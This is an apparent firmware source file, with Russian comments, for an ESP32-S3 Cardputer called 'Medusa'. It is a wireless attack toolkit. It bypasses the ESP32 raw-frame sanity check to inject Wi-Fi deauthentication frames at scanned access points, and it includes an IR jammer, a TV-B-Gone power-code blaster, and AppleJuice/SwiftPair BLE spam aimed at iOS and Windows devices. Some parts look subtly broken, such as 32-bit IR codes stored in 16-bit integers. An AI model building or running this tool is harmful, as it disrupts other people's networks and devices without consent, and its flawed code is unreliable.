/*
 * Medusa — кастомная прошивка для M5Stack Cardputer ADV (ESP32-S3)
 * Стиль: тёмный фон, синие акценты, белый текст.
 * Управление: ; (вверх), . (вниз), Enter — выбор, ` (тильда) — назад/выход.
 */

#include <M5Cardputer.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>
#include <NimBLEDevice.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_sleep.h>
#include <algorithm>
#include <vector>

// ======================= ОБХОД ПРОВЕРКИ КАДРОВ (DEAUTH) =======================
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

// ======================= КОНСТАНТЫ И ПИНЫ =======================
#define IR_TX_PIN 44
#define SCREEN_W  240
#define SCREEN_H  135

// Цвета (океаническая гамма)
#define BG_COLOR     0x0000 // Чёрный
#define PANEL_COLOR  0x001F // Тёмно-синий
#define ACCENT_COLOR 0x07FF // Ярко-голубой (Cyan)
#define TEXT_COLOR   0xFFFF // Белый
#define DIM_COLOR    0x8410 // Серый

// ======================= ГЛОБАЛЬНЫЕ ОБЪЕКТЫ =======================
IRsend irsend(IR_TX_PIN);

// Состояние экранов
enum Screen { MAIN_MENU, POWER_MENU, IR_MENU, WIFI_MENU, BLE_MENU, WIFI_SCAN, BLE_RUN };
Screen currentScreen = MAIN_MENU;
int menuIndex = 0;
int scanIndex = 0;

// Wi-Fi
struct WiFiNetwork {
    String ssid;
    uint8_t bssid[6];
    int channel;
    int rssi;
};
std::vector<WiFiNetwork> networks;
bool wifiScanning = false;
bool deauthRunning = false;
uint8_t targetBSSID[6];
int targetChannel = 1;

// BLE
bool bleSpamRunning = false;
bool bleAppleJuice = true;
unsigned long lastBlePacket = 0;
NimBLEAdvertising *pAdvertising = nullptr;

// ======================= ПРОТОТИПЫ =======================
void drawBatteryStatus();
void drawMenu(const char *title, const char *items[], int itemCount);
void drawWiFiScan();
int  getItemCount();
void handleMainMenu();
void handlePowerMenu();
void handleIRMenu();
void handleWiFiMenu();
void handleBLEMenu();
void startTVBGone();
void startIRJammer();
void startWiFiScan();
void startTargetDeauth(int index);
void startBLESpam(bool apple);
void runBLESpam();
void goToDeepSleep();

// ======================= НАСТРОЙКА =======================
void setup() {
    Serial.begin(115200);
    auto cfg = M5.config();
    M5Cardputer.begin(cfg, true);
    M5Cardputer.Display.setRotation(1);
    M5Cardputer.Display.fillScreen(BG_COLOR);
    M5Cardputer.Display.setTextColor(TEXT_COLOR, BG_COLOR);
    M5Cardputer.Display.setTextSize(1);
    irsend.begin();
    currentScreen = MAIN_MENU;
    menuIndex = 0;
}

// ======================= КОЛИЧЕСТВО ПУНКТОВ ТЕКУЩЕГО МЕНЮ =======================
int getItemCount() {
    switch (currentScreen) {
        case MAIN_MENU:  return 4;
        case POWER_MENU: return 3;
        case IR_MENU:    return 2;
        case WIFI_MENU:  return 1;
        case BLE_MENU:   return 2;
        case WIFI_SCAN:  return (int)networks.size();
        default:         return 1;
    }
}

// ======================= ОСНОВНОЙ ЦИКЛ =======================
void loop() {
    M5Cardputer.update();

    if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
        Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();

        bool up   = std::find(status.word.begin(), status.word.end(), ';') != status.word.end();
        bool down = std::find(status.word.begin(), status.word.end(), '.') != status.word.end();
        bool back = std::find(status.word.begin(), status.word.end(), '`') != status.word.end();

        // Навигация с зацикливанием и защитой границ
        if (currentScreen == WIFI_SCAN) {
            int n = (int)networks.size();
            if (n > 0) {
                if (up)   { scanIndex--; if (scanIndex < 0)  scanIndex = n - 1; }
                if (down) { scanIndex++; if (scanIndex >= n) scanIndex = 0; }
            }
        } else {
            int count = getItemCount();
            if (count > 0) {
                if (up)   { menuIndex--; if (menuIndex < 0)      menuIndex = count - 1; }
                if (down) { menuIndex++; if (menuIndex >= count) menuIndex = 0; }
            }
        }

        // Действия
        if (status.enter) {
            if (currentScreen == MAIN_MENU)        handleMainMenu();
            else if (currentScreen == POWER_MENU)  handlePowerMenu();
            else if (currentScreen == IR_MENU)     handleIRMenu();
            else if (currentScreen == WIFI_MENU)   handleWiFiMenu();
            else if (currentScreen == BLE_MENU)    handleBLEMenu();
            else if (currentScreen == WIFI_SCAN)   startTargetDeauth(scanIndex);
        }
        else if (back) {
            if (currentScreen != MAIN_MENU) {
                currentScreen = MAIN_MENU;
                menuIndex = 0;
                scanIndex = 0;
            }
        }
    }

    M5Cardputer.Display.fillScreen(BG_COLOR);
    drawBatteryStatus();

    switch (currentScreen) {
        case MAIN_MENU: {
            const char* items[] = {"Power", "IR", "Wi-Fi", "BLE"};
            drawMenu("Medusa", items, 4);
            break;
        }
        case POWER_MENU: {
            const char* items[] = {"Deep Sleep", "Restart", "Power Off"};
            drawMenu("Power", items, 3);
            break;
        }
        case IR_MENU: {
            const char* items[] = {"TV-B-Gone", "IR Jammer"};
            drawMenu("IR", items, 2);
            break;
        }
        case WIFI_MENU: {
            const char* items[] = {"Scan & Target Deauth"};
            drawMenu("Wi-Fi", items, 1);
            break;
        }
        case WIFI_SCAN: {
            drawWiFiScan();
            break;
        }
        case BLE_MENU: {
            const char* items[] = {"AppleJuice (iOS)", "SwiftPair (Windows)"};
            drawMenu("BLE Spam", items, 2);
            break;
        }
        case BLE_RUN: {
            M5Cardputer.Display.setCursor(10, 40);
            M5Cardputer.Display.setTextColor(ACCENT_COLOR, BG_COLOR);
            M5Cardputer.Display.print(bleAppleJuice ? "AppleJuice Running" : "SwiftPair Running");
            M5Cardputer.Display.setTextColor(DIM_COLOR, BG_COLOR);
            M5Cardputer.Display.setCursor(10, 60);
            M5Cardputer.Display.print("` to stop");
            if (bleSpamRunning) runBLESpam();
            break;
        }
    }
    delay(10);
}

// ======================= ОТРИСОВКА =======================
void drawBatteryStatus() {
    M5Cardputer.Display.fillRect(0, 0, SCREEN_W, 16, PANEL_COLOR);
    M5Cardputer.Display.setTextColor(TEXT_COLOR, PANEL_COLOR);
    M5Cardputer.Display.setCursor(4, 2);
    M5Cardputer.Display.print("Medusa");

    int bat = M5.Power.getBatteryLevel();
    if (bat < 0) bat = 0;
    M5Cardputer.Display.setCursor(SCREEN_W - 50, 2);
    M5Cardputer.Display.print(String(bat) + "%");

    int iconX = SCREEN_W - 18;
    int iconY = 3;
    M5Cardputer.Display.drawRect(iconX, iconY, 12, 8, TEXT_COLOR);
    M5Cardputer.Display.fillRect(iconX + 1, iconY + 1, (bat * 10) / 100, 6, ACCENT_COLOR);
}

void drawMenu(const char *title, const char *items[], int itemCount) {
    if (itemCount <= 0) return;

    // Страховка от выхода menuIndex за пределы
    if (menuIndex < 0)          menuIndex = itemCount - 1;
    if (menuIndex >= itemCount) menuIndex = 0;

    M5Cardputer.Display.setTextColor(ACCENT_COLOR, BG_COLOR);
    M5Cardputer.Display.setCursor(10, 22);
    M5Cardputer.Display.print(title);
    M5Cardputer.Display.drawFastHLine(10, 32, SCREEN_W - 20, ACCENT_COLOR);

    for (int i = 0; i < itemCount; i++) {
        int y = 38 + i * 14;
        if (i == menuIndex) {
            M5Cardputer.Display.fillRect(8, y - 2, SCREEN_W - 16, 14, ACCENT_COLOR);
            M5Cardputer.Display.setTextColor(BG_COLOR, ACCENT_COLOR);
        } else {
            M5Cardputer.Display.setTextColor(TEXT_COLOR, BG_COLOR);
        }
        M5Cardputer.Display.setCursor(12, y);
        M5Cardputer.Display.print(items[i]);
    }
}

void drawWiFiScan() {
    M5Cardputer.Display.setTextColor(ACCENT_COLOR, BG_COLOR);
    M5Cardputer.Display.setCursor(10, 22);
    M5Cardputer.Display.print("Scanning...");

    int n = WiFi.scanComplete();
    if (n > 0) {
        networks.clear();
        for (int i = 0; i < n && i < 8; i++) {
            WiFiNetwork net;
            net.ssid = WiFi.SSID(i);
            memcpy(net.bssid, WiFi.BSSID(i), 6);
            net.channel = WiFi.channel(i);
            net.rssi = WiFi.RSSI(i);
            networks.push_back(net);
        }
        WiFi.scanDelete();
        wifiScanning = false;
        if (scanIndex >= (int)networks.size()) scanIndex = 0;
    }

    if (!wifiScanning && networks.size() > 0) {
        int total = (int)networks.size();
        if (scanIndex < 0)      scanIndex = total - 1;
        if (scanIndex >= total) scanIndex = 0;

        for (int i = 0; i < total && i < 8; i++) {
            int y = 38 + i * 12;
            if (i == scanIndex) {
                M5Cardputer.Display.fillRect(8, y - 2, SCREEN_W - 16, 12, ACCENT_COLOR);
                M5Cardputer.Display.setTextColor(BG_COLOR, ACCENT_COLOR);
            } else {
                M5Cardputer.Display.setTextColor(TEXT_COLOR, BG_COLOR);
            }
            M5Cardputer.Display.setCursor(12, y);
            M5Cardputer.Display.print(networks[i].ssid.substring(0, 16));
        }
    }
}

// ======================= ОБРАБОТЧИКИ МЕНЮ =======================
void handleMainMenu() {
    if (menuIndex == 0)      currentScreen = POWER_MENU;
    else if (menuIndex == 1) currentScreen = IR_MENU;
    else if (menuIndex == 2) currentScreen = WIFI_MENU;
    else if (menuIndex == 3) currentScreen = BLE_MENU;
    menuIndex = 0;
}

void handlePowerMenu() {
    if (menuIndex == 0)      goToDeepSleep();
    else if (menuIndex == 1) ESP.restart();
    else if (menuIndex == 2) M5.Power.powerOff();
    menuIndex = 0;
}

void handleIRMenu() {
    if (menuIndex == 0)      startTVBGone();
    else if (menuIndex == 1) startIRJammer();
}

void handleWiFiMenu() {
    currentScreen = WIFI_SCAN;
    startWiFiScan();
}

void handleBLEMenu() {
    bleAppleJuice = (menuIndex == 0);
    startBLESpam(bleAppleJuice);
    currentScreen = BLE_RUN;
}

// ======================= POWER =======================
void goToDeepSleep() {
    M5Cardputer.Display.fillScreen(BG_COLOR);
    M5Cardputer.Display.setTextColor(TEXT_COLOR, BG_COLOR);
    M5Cardputer.Display.setCursor(10, 50);
    M5Cardputer.Display.print("Deep Sleep...");
    delay(500);
    M5.Power.deepSleep();
}

// ======================= IR =======================
void startTVBGone() {
    M5Cardputer.Display.fillScreen(BG_COLOR);
    M5Cardputer.Display.setTextColor(ACCENT_COLOR, BG_COLOR);
    M5Cardputer.Display.setCursor(10, 40);
    M5Cardputer.Display.print("TV-B-Gone...");

    uint16_t powerCodes[] = {0x20DF10EF, 0xE0E040BF, 0x10EF, 0x48B7, 0x00FF};
    for (int i = 0; i < 5; i++) {
        irsend.sendNEC(powerCodes[i], 32);
        delay(20);
    }
}

void startIRJammer() {
    M5Cardputer.Display.fillScreen(BG_COLOR);
    M5Cardputer.Display.setTextColor(ACCENT_COLOR, BG_COLOR);
    M5Cardputer.Display.setCursor(10, 40);
    M5Cardputer.Display.print("IR Jammer...");

    uint16_t raw[4] = {80, 80, 80, 80};
    for (int freq = 30000; freq <= 56000; freq += 2000) {
        irsend.sendRaw(raw, 4, freq);
        delay(10);
        M5Cardputer.update();
    }
}

// ======================= WI-FI =======================
void startWiFiScan() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    networks.clear();
    scanIndex = 0;
    wifiScanning = true;
    WiFi.scanNetworks(true, false);
}

void startTargetDeauth(int index) {
    if (index < 0 || index >= (int)networks.size()) return;
    memcpy(targetBSSID, networks[index].bssid, 6);
    targetChannel = networks[index].channel;
    deauthRunning = true;

    // Wi-Fi уже инициализирован через WiFi.mode(WIFI_STA) — повторный esp_wifi_init() даст Kernel Panic
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

    uint8_t deauthFrame[26] = {
        0xC0, 0x00, 0x3A, 0x01,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x07, 0x00
    };
    memcpy(&deauthFrame[10], targetBSSID, 6);
    memcpy(&deauthFrame[16], targetBSSID, 6);

    for (int i = 0; i < 10; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
        delay(5);
    }
    deauthRunning = false;
    currentScreen = WIFI_MENU;
}

// ======================= BLE =======================
void startBLESpam(bool apple) {
    NimBLEDevice::init(apple ? "AppleJuice" : "SwiftPair");
    pAdvertising = NimBLEDevice::getAdvertising();
    bleSpamRunning = true;
    lastBlePacket = 0;
}

void runBLESpam() {
    if (!bleSpamRunning) return;
    if (millis() - lastBlePacket < 50) return;
    lastBlePacket = millis();

    NimBLEAdvertisementData advData;
    if (bleAppleJuice) {
        uint8_t applePayload[17] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x00, 0x00, 0x00,
                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        advData.addData(std::string((char*)applePayload, 17));
    } else {
        advData.setName("SwiftPair Device");
        advData.setManufacturerData(std::string("\x06\x00\x03\x03\x00\x00", 6));
    }
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    delay(10);
    pAdvertising->stop();
}
